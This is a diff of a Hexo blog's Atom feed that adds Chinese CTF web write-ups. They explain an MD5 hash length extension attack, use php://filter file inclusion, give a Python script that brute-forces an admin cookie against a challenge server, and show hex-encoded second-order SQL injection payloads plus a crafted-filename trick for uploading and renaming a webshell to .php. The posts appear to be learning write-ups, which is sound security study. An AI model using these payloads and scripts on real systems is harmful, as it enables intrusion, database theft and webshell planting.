@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoururl.com/"/>
-  <updated>2018-04-08T12:50:51.244Z</updated>
+  <updated>2018-05-09T06:43:47.064Z</updated>
   <id>http://yoururl.com/</id>
   
   <author>
@@ -17,11 +17,73 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>文件上传之代码审计</title>
+    <title>hash长度拓展攻击</title>
+    <link href="http://yoururl.com/2018/05/08/hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/"/>
+    <id>http://yoururl.com/2018/05/08/hash长度拓展攻击/</id>
+    <published>2018-05-08T14:15:00.000Z</published>
+    <updated>2018-05-09T06:43:47.064Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="Hash-Length-Extension-Attack"><a href="#Hash-Length-Extension-Attack" class="headerlink" title="Hash Length Extension Attack"></a>Hash Length Extension Attack</h3><p>&emsp;&emsp;总体来说就是我们知道一个加盐的hash值，即使我们不知道盐的具体内容，但只要知道长度就可以随便伪造种带盐的hash（相当于我们控制了明密文）<br><br></p><h1 id="MD5加密原理"><a href="#MD5加密原理" class="headerlink" title="MD5加密原理"></a>MD5加密原理</h1><p>先介绍一下md5加密的原理<br><img src="\images\pasted-25.png" alt="upload successful"></p><p>个人理解: md5的过程可以分成<strong>填充</strong>和<strong>压缩</strong>的过程<br></p><ul><li>md5 padding(填充)<br>&emsp;&emsp;message padding<br>&emsp;&emsp;length%64=56(8位标识原始长度)<br>填充的时候，将会使用16进制数据：<br>&emsp;~1个\x80<br>&emsp;~N个\0x00      </li><li>md5 compress(压缩)<br>&emsp;&emsp;message padding length—–&gt;hash<br>&emsp;&emsp;length=N*64(bit)      —–&gt;length%64(bit)<br><br></li></ul><h2 id="md5-padding"><a href="#md5-padding" class="headerlink" title="md5 padding"></a>md5 padding</h2><p><em>例如我们把admin来hash一下:</em><br>admin  先hex编码-&gt;61646d696e<br>再填充80<br>不满64bit，填充到第56位（50个00）——为了保证信息的长度为N*64+56(字节)<br>最后数据表示位2800000000000000（8个字节）<br>最终结果为:</p><blockquote><p>61646d6968000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002800000000000000<br><br></p></blockquote><p><strong>什么是Magic number (确定值)</strong><br>代码中的0x67452301L, 0xefcdab89L, 0x98badcfeL, 0x10325476L这4个初始化的number就被称为Magic number或者是md5 iv (md5向量)<br><br><br></p><h2 id="md5-compress"><a href="#md5-compress" class="headerlink" title="md5 compress"></a>md5 compress</h2><p>我们发现，无论输入多长的信息，计算出来的问就按hash长度都是固定的(md5有32字节)，这就是因为hash算法是一种压缩算法。<br>Hash设计的时候不要求还原，所以就尽可能的扩大信息对每一位hash值的印象。在计算中，也是通过对每组长度为64bit信息分组进行迭代运算实现的。<br>每一次迭代，都会利用一个初始值与本组中的原始信息做一个复杂的数学运算，而将生成的结果带入到下次的复杂运算中作为初始值<br><br><br>我们还是计算admin的md5值。因为不满64bit,所以padding之后也只有64个bit，也就需要计算一轮compress压缩算法。压缩算法完成后产生的心magic number为：<br>A=0x292f2321L<br>B=0xa7a5577aL<br>C=0xe4a8943L<br>D=0xc31f804aL<br>而md5的结果:<br><img src="\images\pasted-26.png" alt="upload successful"><br>我们发现其实就是这一轮结果的简单拼接（小端存储数据倒叙）<br><br></p><h1 id="hash长度拓展攻击"><a href="#hash长度拓展攻击" class="headerlink" title="hash长度拓展攻击"></a>hash长度拓展攻击</h1><p>其实只要知道三点就能后进行攻击：</p><ul><li>MD5(salt+message)的值</li><li>message内容</li><li>salt+message长度<br>这样就可以在不知道salt的具体内容下，计算出任意的md5(salt+message+padding+append)值<br>因为salt+message+padding内容是经过填充的，一定是N*64，所以这个部分刚好能完成N轮复杂运算。而他的结果，也就是md5(salt+message+padding)刚好是用来做下一轮运算，也就是m’+padding运算的初始向量。<br><img src="\images\pasted-27.png" alt="upload successful"></li></ul><h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p>逆向算法很简单</p><pre><code>def compute_magic_number(self, md5str):    self.A = struct.unpack(&quot;I&quot;, md5str[0:8].decode(&apos;hex&apos;))[0]    self.B = struct.unpack(&quot;I&quot;, md5str[8:16].decode(&apos;hex&apos;))[0]    self.C = struct.unpack(&quot;I&quot;, md5str[16:24].decode(&apos;hex&apos;))[0]    self.D = struct.unpack(&quot;I&quot;, md5str[24:32].decode(&apos;hex&apos;))[0]</code></pre><p>由它逆出A=0x292f2321L,B=0xa7a5577aL,C=0xe4a8943L,D=0xc31f804aL<br>根据这4个Magci number，再和扩展的字符串m’(此时的m’要进行padding，padding的长度是len(salt+message+padding+m’))进行md5 compress，最后的结果即md5(salt+message+padding+m’)<br>这样就完成了长度拓展攻击</p><h2 id="例题测试"><a href="#例题测试" class="headerlink" title="例题测试"></a>例题测试</h2>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;Hash-Length-Extension-Attack&quot;&gt;&lt;a href=&quot;#Hash-Length-Extension-Attack&quot; class=&quot;headerlink&quot; title=&quot;Hash Length Extension Attack&quot;&gt;&lt;/a&gt;Ha
+      
+    
+    </summary>
+    
+      <category term="CTF" scheme="http://yoururl.com/categories/CTF/"/>
+    
+      <category term="web" scheme="http://yoururl.com/categories/CTF/web/"/>
+    
+    
+      <category term="web" scheme="http://yoururl.com/tags/web/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>蓝鲸笔记系统writeup</title>
+    <link href="http://yoururl.com/2018/04/10/%E8%93%9D%E9%B2%B8%E7%AC%94%E8%AE%B0%E7%B3%BB%E7%BB%9Fwriteup/"/>
+    <id>http://yoururl.com/2018/04/10/蓝鲸笔记系统writeup/</id>
+    <published>2018-04-10T07:30:00.000Z</published>
+    <updated>2018-04-10T07:50:35.917Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="蓝鲸笔记系统"><a href="#蓝鲸笔记系统" class="headerlink" title="蓝鲸笔记系统"></a>蓝鲸笔记系统</h4><p>给出一个login界面，url看上去似乎有问题<br><br><a href="http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;mode=login" target="_blank" rel="noopener">http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;mode=login</a><br><br>感觉像是有文件包含<br><br>随便尝试一下<a href="http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;mode=index" target="_blank" rel="noopener">http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;mode=index</a><br><br><img src="\images\pasted-0.png" alt="upload successful"><br>果然是文件包含。先随便注册一个账号进去看看，发现 hint:./dbinit.sql</p><p><img src="\images\pasted-4.png" alt="upload successful"><br>发现了flag字段，flag应该就是在数据库里面了</p><p>肯定是文件包含无疑了，相办法读源码</p><h5 id="利用php伪协议读源码："><a href="#利用php伪协议读源码：" class="headerlink" title="利用php伪协议读源码："></a>利用php伪协议读源码：</h5><p>php://filter/read=convert.base64-encode/resource=<br><img src="\images\pasted-5.png" alt="upload successful"><br>不让读，真尴尬</p><p>然后仔细看了看url，猜测这个front是文件夹名，login是文件名<br><a href="http://202.98.28.108:10013/7sghfe673jd3/front/index.php" target="_blank" rel="noopener">http://202.98.28.108:10013/7sghfe673jd3/front/index.php</a><br><img src="\images\pasted-6.png" alt="upload successful"><br><img src="\images\pasted-7.png" alt="upload successful"><br>还是拒绝访问…</p><p>猜测后台脚本是这样写的:<br><br>include($action.’/‘.$mode.’.php’)<br><br>require”$action.’/‘.$mode.’.php’”</p><p><img src="\images\pasted-8.png" alt="upload successful"><br>成功读出来了！！！<br><br>login不让读，但是审计index.php的源码时发现common.php，顺便把源码也down下来</p><h5 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h5><p>先看一下index.php，并没有发现什么东西<br>在common.php中发现一些定义的函数</p><p>御剑扫一下，发现/admin/login.php , /admin/index.php，把源码都down下来<br><br>在/admin/login.php中发现<br><img src="\images\pasted-9.png" alt="upload successful"></p><p>/admin/login.php,调用了set_login()函数</p><p><img src="\images\pasted-10.png" alt="upload successful"></p><p>/front/common.php中有set_login()函数的定义</p><p><img src="\images\pasted-11.png" alt="upload successful"></p><p><img src="\images\pasted-12.png" alt="upload successful"></p><p><img src="\images\pasted-13.png" alt="upload successful"></p><p><img src="\images\pasted-14.png" alt="upload successful"></p><p>来到<a href="http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&amp;mode=login" target="_blank" rel="noopener">http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&amp;mode=login</a></p><p><img src="\images\pasted-15.png" alt="upload successful"><br>跟踪一下这几个函数，这里设置了cookies和session。可以看出来最后set_cookie的值是$uname|$endata<br>$uname是admin。则cookie是 admin|md5(SECURITY_KEY+admin) <br><br>SECURITY_KEY 是个随机数，每一位是从wh两个字母中随机出来的6位随机数</p><p>看一下后台登陆验证</p><p><img src="\images\pasted-16.png" alt="upload successful"><br>两个函数在common.php中</p><p><img src="\images\pasted-17.png" alt="upload successful"></p><p><img src="\images\pasted-18.png" alt="upload successful"><br>这里验证了userid和level，如果cookie验证失败，则返回false，level如果是0，也返回false。</p><p>但是如果我们没有登陆，直接来到/admin/index.php页面，而且绕过cookie的验证，那么userid和level的默认初始值都是null。在php中，<br>null!==False</p><blockquote><blockquote><p>True<br>null!=False<br>False<br>$null!==false是返回true的。所以只要我们能伪造cookie，就可以绕过验证。</p></blockquote></blockquote><h5 id="爆破cookie脚本"><a href="#爆破cookie脚本" class="headerlink" title="爆破cookie脚本"></a>爆破cookie脚本</h5><pre><code>import requestsimport hashlibimport randomimport stringfalse_tag = &quot;not login!&quot;url = &quot;http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&amp;mode=index&quot;url_csrf = &quot;http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&amp;mode=login&quot;def rand_str(length):    return &apos;&apos;.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))def md5_encode(data):    hash = hashlib.md5()    hash.update((data + &quot;admin&quot;).encode())    return hash.hexdigest()key = []for x1 in [&quot;w&quot;,&quot;h&quot;]:    for x2 in [&quot;w&quot;,&quot;h&quot;]:        for x3 in [&quot;w&quot;,&quot;h&quot;]:            for x4 in [&quot;w&quot;,&quot;h&quot;]:                for x5 in [&quot;w&quot;,&quot;h&quot;]:                    for x6 in [&quot;w&quot;,&quot;h&quot;]:                        key.append(x1+x2+x3+x4+x5+x6)                        print keys = requests.Session()    s.headers = {        &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36&apos;,        &apos;cookie&apos;: &apos;&apos;    }for x in key:       s.headers[&quot;cookie&quot;] = &quot;uid=admin%7C&quot;+md5_encode(x)#+&quot;;&quot;+&quot;PHPSESSID={}&quot;.format(rand_str(26))    s.headers[&quot;PHPSESSID&quot;] = rand_str(26)    print s.headers[&quot;cookie&quot;]    result = s.get(url)    #print result.content    if false_tag in result.content:        print &quot;NO&quot;,x    else:        print &quot;YES&quot;        print s.headers        print result.content        break</code></pre><p><img src="\images\pasted-19.png" alt="upload successful"></p><p>发现setpagenumu页面，down下来源码</p><p><img src="\images\pasted-20.png" alt="upload successful"></p><h5 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h5><p>发现post的page是用户可以输入<br>但是类型限制了纯数字，应该是没有办法注入</p><p>回去审计/admin/index.php</p><p><img src="\images\pasted-21.png" alt="upload successful"><br>发现数据库里查询的是$page_size,跟踪get_page_size(),</p><p><img src="\images\pasted-22.png" alt="upload successful"><br>get_page_size()函数返回num，也就是index里面的$page_size<br>感觉应该能注入，回去看数据库文件</p><p><img src="\images\pasted-23.png" alt="upload successful"><br>发现数据库里定义的page是varchar类型<br>标准的脚本代码与数据库类型不匹配<br>利用is_numeric()函数的漏洞(认为0x…是整数)，构造一个二次注入</p><p>数据库文件中可以看到一共有四个列</p><p><img src="\images\pasted-24.png" alt="upload successful"><br>构造注入语句<br>2 union select 1,flag,flag,4 from flags<br>转成十六进制注入即可拿到flag<br>0x3220756e696f6e2073656c65637420312c666c61672c666c61672c342066726f6d20666c616773</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h4 id=&quot;蓝鲸笔记系统&quot;&gt;&lt;a href=&quot;#蓝鲸笔记系统&quot; class=&quot;headerlink&quot; title=&quot;蓝鲸笔记系统&quot;&gt;&lt;/a&gt;蓝鲸笔记系统&lt;/h4&gt;&lt;p&gt;给出一个login界面，url看上去似乎有问题&lt;br&gt;&lt;br&gt;&lt;a href=&quot;http://202.98.
+      
+    
+    </summary>
+    
+      <category term="CTF" scheme="http://yoururl.com/categories/CTF/"/>
+    
+      <category term="web" scheme="http://yoururl.com/categories/CTF/web/"/>
+    
+    
+      <category term="代码审计" scheme="http://yoururl.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+      <category term="二次注入" scheme="http://yoururl.com/tags/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
+    
+      <category term="php函数漏洞" scheme="http://yoururl.com/tags/php%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/"/>
+    
+      <category term="php伪协议" scheme="http://yoururl.com/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
+    
+      <category term="CSRF" scheme="http://yoururl.com/tags/CSRF/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>文件管理系统writeup</title>
     <link href="http://yoururl.com/2018/04/08/day1%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
     <id>http://yoururl.com/2018/04/08/day1文件管理系统/</id>
     <published>2018-04-08T12:11:00.000Z</published>
-    <updated>2018-04-08T12:50:51.244Z</updated>
+    <updated>2018-04-10T07:52:33.587Z</updated>
     
     <content type="html"><![CDATA[<h3 id="文件上传之代码审计"><a href="#文件上传之代码审计" class="headerlink" title="文件上传之代码审计"></a>文件上传之代码审计</h3><p>前几天做了一道有趣的web题，涉及到文件上传，代码审计，二次注入。</p><p>首先是一个文件管理系统，上传文件，重命名文件，删除文件的功能。也给出了网站源码。<img src="\images\pasted-1.png" alt="upload successful"><br>先审计代码，看一下upload.php<br><img src="\images\pasted-2.png" alt="upload successful"><br>文件上传函数，先看服务器怎么检查文件的，可以看到$pat_part[“extension”]不允许php上传<br>其中文件名 也被addslashes函数过滤，转义了一些字符，因此这里应该不存在注入</p><p>文件名存在数据库两个字段中，一个是filename（文件名），一个是extension（后缀名）</p><p>可以看出来文件名走过的流程是：<br>$file[‘name’]—&gt;pathinfo()—&gt;$path_part[‘filename’]—&gt;addslashes()—&gt;insert</p><p>再看一下rename.php<br><img src="\images\pasted-3.png" alt="upload successful"><br>首先查询文件名，如果存在，执行sql语句<br>根据$req[‘filename’]从数据库里查询到已存在的一行，并调用update语句进行修改</p><p>但在这里{oldname=[‘filename’]}将从数据库里查出的$result[‘filename’]再一次入库，结果造成一个二次注入</p><p>如果我们可以插入让extension的值为空，再把文件名在改名为.php就可以解析了</p><p>那么思路很明确，我们上传一个有恶意字段的jpg文件，然后rename进数据库，让后缀名变为空，然后再上传一个木马文件，由于extension为空，所以再次修改的时候不会加上.jpg的扩展名。</p><h5 id="解题步骤："><a href="#解题步骤：" class="headerlink" title="解题步骤："></a>解题步骤：</h5><blockquote><ul><li>上传文件名为’,extension=’’,filename=’aa.jpg.jpg</li><li>这样filename的值为’,extension=’’,filename=’aa.jpg</li><li>我们重命名把’,extension=’’,filename=’aa.jpg改为aa.jpg</li><li>这时我们再次上传一个写有木马的文件，文件名为aa.jpg</li><li>此时不会提示file is exists 因为extension!=jpg</li><li>将aa.jpg改为aa.php即可</li></ul></blockquote>]]></content>
     
@@ -35,7 +97,9 @@
     
     </summary>
     
-      <category term="文件上传" scheme="http://yoururl.com/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+      <category term="CTF" scheme="http://yoururl.com/categories/CTF/"/>
+    
+      <category term="web" scheme="http://yoururl.com/categories/CTF/web/"/>
     
     
       <category term="文件上传" scheme="http://yoururl.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
@@ -44,16 +108,14 @@
     
       <category term="二次注入" scheme="http://yoururl.com/tags/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
     
-      <category term="CTF" scheme="http://yoururl.com/tags/CTF/"/>
-    
   </entry>
   
   <entry>
     <title>Hello World</title>
     <link href="http://yoururl.com/2018/04/07/hello-world/"/>
     <id>http://yoururl.com/2018/04/07/hello-world/</id>
-    <published>2018-04-07T09:41:50.757Z</published>
-    <updated>2018-04-06T08:44:28.296Z</updated>
+    <published>2018-04-07T09:41:00.000Z</published>
+    <updated>2018-04-10T07:53:50.721Z</updated>
     
     <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
     
@@ -71,28 +133,21 @@
   
   <entry>
     <title>杂记</title>
-    <link href="http://yoururl.com/2018/04/06/%E6%9D%82%E8%AE%B0/"/>
-    <id>http://yoururl.com/2018/04/06/杂记/</id>
+    <link href="http://yoururl.com/2018/04/06/rsa%E6%80%BB%E7%BB%93/"/>
+    <id>http://yoururl.com/2018/04/06/rsa总结/</id>
     <published>2018-04-06T08:33:00.000Z</published>
-    <updated>2018-04-06T10:16:35.248Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="一"><a href="#一" class="headerlink" title="一"></a>一</h1><h2 id="二"><a href="#二" class="headerlink" title="二"></a>二</h2><h3 id="三"><a href="#三" class="headerlink" title="三"></a>三</h3><h4 id="四"><a href="#四" class="headerlink" title="四"></a>四</h4><p> test</p>]]></content>
+    <updated>2018-04-10T07:56:06.328Z</updated>
     
     <summary type="html">
     
-      
-      
-        &lt;h1 id=&quot;一&quot;&gt;&lt;a href=&quot;#一&quot; class=&quot;headerlink&quot; title=&quot;一&quot;&gt;&lt;/a&gt;一&lt;/h1&gt;&lt;h2 id=&quot;二&quot;&gt;&lt;a href=&quot;#二&quot; class=&quot;headerlink&quot; title=&quot;二&quot;&gt;&lt;/a&gt;二&lt;/h2&gt;&lt;h3 id=&quot;三&quot;&gt;&lt;a 
-      
-    
     </summary>
     
-      <category term="密码学" scheme="http://yoururl.com/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
+      <category term="crypto" scheme="http://yoururl.com/categories/crypto/"/>
     
     
       <category term="crypto" scheme="http://yoururl.com/tags/crypto/"/>
     
-      <category term=" web" scheme="http://yoururl.com/tags/web/"/>
+      <category term="rsa" scheme="http://yoururl.com/tags/rsa/"/>
     
   </entry>
   
@@ -117,9 +172,9 @@
       <category term="文件上传" scheme="http://yoururl.com/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
     
     
-      <category term="web" scheme="http://yoururl.com/tags/web/"/>
-    
       <category term="文件上传" scheme="http://yoururl.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    
+      <category term="web" scheme="http://yoururl.com/tags/web/"/>
     
       <category term="文件包含" scheme="http://yoururl.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
     
@@ -156,7 +211,7 @@
     <link href="http://yoururl.com/2018/03/31/my-frist-bolg/"/>
     <id>http://yoururl.com/2018/03/31/my-frist-bolg/</id>
     <published>2018-03-31T14:29:00.000Z</published>
-    <updated>2018-04-06T08:44:28.296Z</updated>
+    <updated>2018-04-10T07:53:41.495Z</updated>
     
     <content type="html"><![CDATA[<p>努力做一名白帽子</p>]]></content>
     
@@ -174,8 +229,6 @@
     
     
       <category term="test" scheme="http://yoururl.com/tags/test/"/>
-    
-      <category term="introduction" scheme="http://yoururl.com/tags/introduction/"/>
     
   </entry>
   
